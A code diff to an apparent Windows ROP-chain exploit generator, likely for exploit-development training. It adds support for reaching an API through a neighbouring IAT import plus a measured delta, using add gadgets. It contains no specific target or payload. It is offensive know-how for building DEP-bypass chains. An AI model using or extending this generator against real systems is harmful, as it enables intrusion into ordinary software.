@@ -94,6 +94,9 @@ export type BuildInput = {
   /** Gadget addresses the chain must not use, from the exclude argument. */
   exclude: number[];
   iatSlot?: number;
+  /** Set when no fixed module imports the API itself: the slot holds another export of the same DLL,
+   * and the API is that pointer plus this distance. */
+  delta?: Delta;
   writable?: number;
   cave?: number;
   jmpEsp?: number;
@@ -102,6 +105,9 @@ export type BuildInput = {
   stage: number;
   solve: (register: string, value: number, keep: string[]) => ValueRecipe | undefined;
 };
+
+/** The API reached from a neighbouring import of the same DLL, measured live: right for this build only. */
+export type Delta = { dll: string; anchor: string; value: number };
 
 // A section either has code to copy or a reason why it has none. There is no empty block.
 export type Block = { lines: string[] } | { none: string };
@@ -184,13 +190,17 @@ export const HELPER_BLOCK: Block = { lines: [
 export const CORPUS_BLOCK: Block = { none: "the corpus is the search, not the exploit. The gadgets the chain keeps get their names in [4/7]." };
 
 // [2/7] prints before the chain is planned, so its block is built on its own and folded into the build.
-export function slotBlock(api: DepApi, module: string, iatSlot: number | undefined, badchars: number[]): { block: Block; hole?: string } {
+export function slotBlock(api: DepApi, module: string, iatSlot: number | undefined, badchars: number[], delta?: Delta): { block: Block; hole?: string } {
   if (iatSlot === undefined) {
-    const hole = `IAT_SLOT: no module imports ${api}: resolve it at run time, dx @$osed().sc.iat_find("GetProcAddress")`;
+    const hole = `IAT_SLOT: no module with ASLR disabled imports ${api} or anything else from its DLL: the STOP says which layer failed`;
     return { block: { lines: [`# ${hole}`, "IAT_SLOT = hole(\"IAT_SLOT\")"] }, hole };
   }
   const note = isClean(iatSlot, badchars) ? "" : ". It holds a bad byte, so the chain builds it and never sends it";
-  return { block: { lines: [`IAT_SLOT = ${hex(iatSlot)}     # ${api} in ${module}${note}`] } };
+  if (!delta) return { block: { lines: [`IAT_SLOT = ${hex(iatSlot)}     # ${api} in ${module}${note}`] } };
+  return { block: { lines: [
+    `IAT_SLOT = ${hex(iatSlot)}     # ${delta.dll}!${delta.anchor} in ${module}${note}`,
+    `API_DELTA = ${hex(delta.value)}    # ${api} - ${delta.anchor}, measured on this machine. Any Windows update moves it: measure it again on the target`,
+  ] } };
 }
 
 export function buildExploit(input: BuildInput): Build {
@@ -329,7 +339,7 @@ export function buildExploit(input: BuildInput): Build {
 
   // register = value without touching `keep`: a clean value is one pop, a dirty one is a [5/7] recipe,
   // built in the register itself or in a scratch register and moved.
-  const constOps = (register: string, value: number, expression: string, keep: string[], label: string): Op[] => {
+  const tryConstOps = (register: string, value: number, expression: string, keep: string[], label: string): Op[] | undefined => {
     if (isClean(value, badchars)) {
       const pop = popGadget(register, keep);
       if (pop) return [{ call: entry(pop, `load ${register}`, 1), values: [expression] }];
@@ -348,7 +358,24 @@ export function buildExploit(input: BuildInput): Build {
         return [...recipeOps(recipe, label), ...move];
       }
     }
-    return hole(`${register}_value`, `${register} = ${hex(value)} (${label}): no pop and no rop.construct recipe keeps ${keep.join(", ") || "the chain"}`);
+    return undefined;
+  };
+  const constOps = (register: string, value: number, expression: string, keep: string[], label: string): Op[] =>
+    tryConstOps(register, value, expression, keep, label)
+    ?? hole(`${register}_value`, `${register} = ${hex(value)} (${label}): no pop and no rop.construct recipe keeps ${keep.join(", ") || "the chain"}`);
+
+  // register += value through a register `keep` does not need: loaded by a pop or a recipe, then added.
+  const addConst = (register: string, value: number, expression: string, keep: string[]): Op[] | undefined => {
+    const adders = near(rankCandidates(gadgets.filter((gadget) => gadget.capabilities.some((capability) =>
+      capability.kind === "REGISTER_ADD" && capability.register === register && REGISTERS.indexOf(capability.targetRegister ?? "") >= 0
+      && capability.targetRegister !== register && keep.indexOf(capability.targetRegister ?? "") < 0)
+      && usable(gadget, keep, [register]))));
+    for (const gadget of adders) {
+      const by = gadget.capabilities.filter((capability) => capability.kind === "REGISTER_ADD" && capability.register === register)[0].targetRegister ?? "";
+      const ops = tryConstOps(by, value, expression, keep.concat(register), `${by} = ${expression}`);
+      if (ops) return [...ops, { call: entry(gadget, `add ${expression}`), values: [] }];
+    }
+    return undefined;
   };
 
   const capture = pick("capture");
@@ -391,8 +418,12 @@ export function buildExploit(input: BuildInput): Build {
         const expression = offset ? `IAT_SLOT ${offset < 0 ? "+" : "-"} ${hex(Math.abs(offset))}` : "IAT_SLOT";
         const move = moveOps(read.at.dest ?? "", register, keep);
         if (!move) return missing(`no gadget moves ${read.at.dest} into ${register}`);
+        // The distance goes on where an add exists: in the register the read left the pointer in, or after the move.
+        const before = input.delta && read.at.dest ? addConst(read.at.dest, input.delta.value, "API_DELTA", keep) : [];
+        const after = before ? [] : addConst(register, input.delta?.value ?? 0, "API_DELTA", keep);
+        if (!before && !after) return missing(`no gadget adds API_DELTA to ${read.at.dest} or ${register} through a register the chain does not need here`);
         return [...constOps(read.at.address, (input.iatSlot - offset) >>> 0, expression, keep, `${read.at.address} = ${expression}`),
-          { call: entry(read.gadget, "read the IAT slot"), values: [] }, ...move];
+          { call: entry(read.gadget, "read the IAT slot"), values: [] }, ...(before ?? []), ...move, ...(after ?? [])];
       }
       case "const":
         return constOps(register, source.value, hex(source.value), keep, `${slot.name} = ${hex(source.value)}`);
@@ -575,7 +606,7 @@ export function buildExploit(input: BuildInput): Build {
   const cost = table.filter((entry) => entry.pops > 0 || entry.retn > 0);
   const badText = badchars.map((b) => `\\x${b.toString(16).padStart(2, "0")}`).join("");
   const sized = style === "skeleton" && FRAMES[api].some((slot) => slot.source.kind === "size");
-  const slot = slotBlock(api, input.module, input.iatSlot, badchars);
+  const slot = slotBlock(api, input.module, input.iatSlot, badchars, input.delta);
   return {
     table,
     stages,
